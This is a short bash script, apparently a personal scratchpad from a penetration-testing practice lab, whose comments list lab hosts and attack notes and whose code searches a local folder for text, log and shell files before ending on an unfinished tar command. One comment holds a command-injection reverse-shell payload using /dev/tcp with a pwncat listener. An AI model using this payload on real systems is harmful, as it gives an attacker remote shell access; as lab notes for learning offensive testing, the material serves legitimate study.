#!/bin/bash

source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"

# How to use:
# bash /home/kali/Projects/Black-Hat-Bash/playground/playground.sh
# bash ./playground/playground.sh
# bash -x ./playground/playground.sh
# bash -r ./playground/playground.sh
# alias playground="bash /home/kali/Projects/Black-Hat-Bash/playground/playground.sh"

# Vulnerabilities:
# 172.16.10.10:8081
#   bash playground/exercises/run_webshell_opt.sh 172.16.10.10:8081
# 172.16.10.13
#   ssh backup@172.16.10.13
# 172.16.10.12/donate.php
#   pwncat-cs -l -p 1337
#   | bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'

#notify_slack "hello"

find "/home/kali/Projects/Black-Hat-Bash/playground" \
  -readable \
  -type f \
  -name "*.txt" -o -name "*.log" -o -name "*.sh"

tar -c